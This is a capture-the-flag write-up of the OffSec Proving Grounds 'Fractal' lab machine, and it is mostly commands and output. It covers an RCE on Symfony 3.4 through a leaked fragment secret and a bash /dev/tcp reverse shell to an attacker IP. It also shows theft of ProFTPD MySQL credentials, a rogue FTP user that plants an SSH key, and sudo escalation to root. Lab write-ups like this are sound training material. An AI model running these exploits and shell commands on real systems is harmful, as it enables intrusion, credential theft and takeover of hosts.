---
title: "Proving grounds Play: Fractal"
layout: post
date: 2023-10-14 02:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- PG-Practice
- Symfony
- RCE
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds practice linux machine writeup"
---

## Nmap

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1994b952225ed0f8520d363b448bbcf (RSA)
|   256 0f448badad95b8226af036ac19d00ef3 (ECDSA)
|_  256 32e12a6ccc7ce63e23f4808d33ce9b3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/app_dev.php /app_dev.php/*
|_http-title: Welcome!
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 21/tcp open  ftp - ProFTPD

Nothing in here...!

## 80/tcp open  http - Apache httpd 2.4.41 ((Ubuntu))

http://192.168.187.233/

```text
# symfony 3.4 robots.txt
User-agent: *
Disallow: /app_dev.php
Disallow: /app_dev.php/*
```
http://192.168.187.233/app_dev.php

Upon visiting the URL at the bottom of the page there are several options and informations disclosed. The website is using Symfony 3.4.46 which is vulnerable to [Remote Code Execution](https://github.com/ambionics/symfony-exploits).

## Exploitation

Click on the button in the `http://192.168.187.233/app_dev.php` page and which will show an URL where it fetches configuration files. In order to successfully exploit the vulnerabiltiy the `secret` should be obtained from the `app/config/parameters.yml` file.

Visit the below URL to obtain the secret.

```text
http://192.168.187.233/app_dev.php/_profiler/open?file=app/config/parameters.yml
```

**Running Exploit**

```sh
naveenj@hackerspace:|22:50|~/proving_grounds/Fractal/exploit/symfony-exploits$ python3 secret_fragment_exploit.py http://192.168.187.233/_fragment -s 48a8538e6260789558f0dfe29861c05b
The URL /_fragment returns 403, cool

Trying 4 mutations...
  (OK) sha256 48a8538e6260789558f0dfe29861c05b http://192.168.187.233/_fragment 404 http://192.168.187.233/_fragment?_path=&_hash=pJg5Iqk0DEkiGH%2B9AiIFPmO6KY7EtvD64sHvSReQyfA%3D

Trying both RCE methods...
  Method 1: Success!

PHPINFO: http://192.168.187.233/_fragment?_path=_controller%3Dphpinfo%26what%3D-1&_hash=4qF0rPIIXEuWrV%2FrR3ubq%2B%2B%2FSyIj1GyfHi%2FIChKUtFM%3D
RUN: secret_fragment_exploit.py 'http://192.168.187.233/_fragment' --method 1 --secret '48a8538e6260789558f0dfe29861c05b' --algo 'sha256' --internal-url 'http://192.168.187.233/_fragment' --function phpinfo --parameters what:-1
```

**Verify remote code execution**

```sh
naveenj@hackerspace:|23:05|~/proving_grounds/Fractal/exploit/symfony-exploits$ python3 secret_fragment_exploit.py 'http://192.168.187.233/_fragment' --method 2 --secret '48a8538e6260789558f0dfe29861c05b' --algo 'sha256' --internal-url 'http://192.168.187.233/_fragment' --function system --parameters "id"
```

![img](/assets/images/CTF/Proving_Grounds/Fractal/rce.png)

**Obtain reverse shell**

```sh
naveenj@hackerspace:|23:05|~/proving_grounds/Fractal/exploit/symfony-exploits$ python3 secret_fragment_exploit.py 'http://192.168.187.233/_fragment' --method 2 --secret '48a8538e6260789558f0dfe29861c05b' --algo 'sha256' --internal-url 'http://192.168.187.233/_fragment' --function system --parameters "bash -c '/bin/bash -i >& /dev/tcp/192.168.45.245/80 0>&1'"
```

```sh
naveenj@hackerspace:|05:53|~/proving_grounds/Fractal/exploit/symfony-exploits$ nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.242] from (UNKNOWN) [192.168.187.233] 36306
bash: cannot set terminal process group (1012): Inappropriate ioctl for device
bash: no job control in this shell
www-data@fractal:/var/www/html/web$ 
```

**Initial Foothold Obtained**

## Privilege Escalation

As shown in the Nmap results there is a FTP service proftpd is running on port 21 with the mysql module enabled `/etc/proftpd/sql.conf`. We can create new user or add user `benoit` to the service which will give access to user benoit account. 

```sh
www-data@fractal:/etc/proftpd$ ll
total 1.4M
4.0K drwxr-xr-x 107 root root 4.0K Sep 27  2022 ..
4.0K -rw-r--r--   1 root root 2.9K Sep 27  2022 modules.conf
4.0K drwxr-xr-x   3 root root 4.0K Sep 27  2022 .
8.0K -rw-r--r--   1 root root 5.7K Sep 27  2022 proftpd.conf
4.0K -rw-r--r--   1 root root 1.2K Sep 27  2022 sql.conf    #sql config file
4.0K -rw-r--r--   1 root root 2.1K Sep 27  2022 tls.conf
4.0K -rw-r--r--   1 root root  832 Sep 27  2022 virtuals.conf
4.0K -rw-------   1 root root  701 Sep 27  2022 ldap.conf
1.3M -rw-r--r--   1 root root 1.3M Feb 27  2020 blacklist.dat
4.0K drwxr-xr-x   2 root root 4.0K Feb 27  2020 conf.d
 12K -rw-r--r--   1 root root 9.2K Feb 27  2020 dhparams.pem
www-data@fractal:/etc/proftpd$
```

The `sql.conf` has database credentials, extratct the credentials and login via mysql.

```conf
# used to connect to the database 
# databasename@host database_user user_password 
SQLConnectInfo proftpd@localhost proftpd protfpd_with_MYSQL_password
```

Credentials = `proftpd:protfpd_with_MYSQL_password`

```sh
www-data@fractal:/etc/proftpd$ mysql -uproftpd -pprotfpd_with_MYSQL_password
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 11
Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)

Copyright (c) 2000, 2022, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```

Please refer [here](https://medium.com/@nico26deo/how-to-set-up-proftpd-with-a-mysql-backend-on-ubuntu-c6f23a638caf) for more info on creating user for proftpd using mysql.

### Adding User

Use the below to generate the password.

```sh
/bin/echo "{md5}"`/bin/echo -n "password" | openssl dgst -binary -md5 | openssl enc -base64`
```

**Updating table**

```sh
mysql> select * from ftpuser;
+----+--------+-------------------------------+-----+-----+---------------+---------------+-------+---------------------+---------------------+
| id | userid | passwd                        | uid | gid | homedir       | shell         | count | accessed            | modified            |
+----+--------+-------------------------------+-----+-----+---------------+---------------+-------+---------------------+---------------------+
|  1 | www    | {md5}RDLDFEKYiwjDGYuwpgb7Cw== |  33 |  33 | /var/www/html | /sbin/nologin |     0 | 2022-09-27 05:26:29 | 2022-09-27 05:26:29 |
+----+--------+-------------------------------+-----+-----+---------------+---------------+-------+---------------------+---------------------+
1 row in set (0.00 sec)

mysql> INSERT INTO `ftpuser` (`id`, `userid`, `passwd`, `uid`, `gid`, `homedir`, `shell`, `count`, `accessed`, `modified`)
    -> VALUES (NULL, 'benoit', '{md5}X03MO1qnZdYdgyfeuILPmQ==', '1000', '1000', '/', '/bin/bash', '0', '2023-10-14 05:26:29', '2023-10-14 05:26:29');   #query to add user
Query OK, 1 row affected (0.00 sec)

mysql> select * from ftpuser;
+----+--------+-------------------------------+------+------+---------------+---------------+-------+---------------------+---------------------+
| id | userid | passwd                        | uid  | gid  | homedir       | shell         | count | accessed            | modified            |
+----+--------+-------------------------------+------+------+---------------+---------------+-------+---------------------+---------------------+
|  1 | www    | {md5}RDLDFEKYiwjDGYuwpgb7Cw== |   33 |   33 | /var/www/html | /sbin/nologin |     0 | 2022-09-27 05:26:29 | 2022-09-27 05:26:29 |
|  2 | benoit | {md5}X03MO1qnZdYdgyfeuILPmQ== | 1000 | 1000 | /             | /bin/bash     |     0 | 2023-10-14 05:26:29 | 2023-10-14 05:26:29 |
+----+--------+-------------------------------+------+------+---------------+---------------+-------+---------------------+---------------------+
2 rows in set (0.00 sec)
```

## 21/tcp open  ftp - ProFTPD
 
Login to ftp using `benoit:password`.

Direct to user `benoit` directory and create .ssh folder. Download the local machine public ssh key `id_rsa.pub` as authorized_keys into the attacking machine via ftp.

```sh
ftp> cd benoit
250 CWD command successful
ftp> mkdir .ssh
257 "/home/benoit/.ssh" - Directory successfully created
ftp> ls
229 Entering Extended Passive Mode (|||56047|)
150 Opening ASCII mode data connection for file list
-r--r--r--   1 benoit   benoit         33 Oct 15 09:44 local.txt
226 Transfer complete
ftp> cd .ssh
250 CWD command successful
ftp> put authorized_keys 
local: authorized_keys remote: authorized_keys
229 Entering Extended Passive Mode (|||60851|)
150 Opening BINARY mode data connection for authorized_keys
100% |***********************************************************************************************************************************************************************************************|   573       10.50 MiB/s    00:00 ETA
226 Transfer complete
573 bytes sent in 00:00 (1.71 KiB/s)
ftp> 
```

Now SSH to the user `benoit` and run executable permissions list command.

```sh
$ whoami
benoit
$ id
uid=1000(benoit) gid=1000(benoit) groups=1000(benoit)
$ sudo -l
Matching Defaults entries for benoit on fractal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User benoit may run the following commands on fractal:
    (ALL) NOPASSWD: ALL
```

The user is allowed to run ALL. Use `sudo su` to escalate privileges.

```sh
$ sudo su
root@fractal:/home/benoit# id
uid=0(root) gid=0(root) groups=0(root)
root@fractal:/home/benoit# 
```

**Root Obtained**

## Reference

- [https://medium.com/@nico26deo/how-to-set-up-proftpd-with-a-mysql-backend-on-ubuntu-c6f23a638caf](https://medium.com/@nico26deo/how-to-set-up-proftpd-with-a-mysql-backend-on-ubuntu-c6f23a638caf)

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).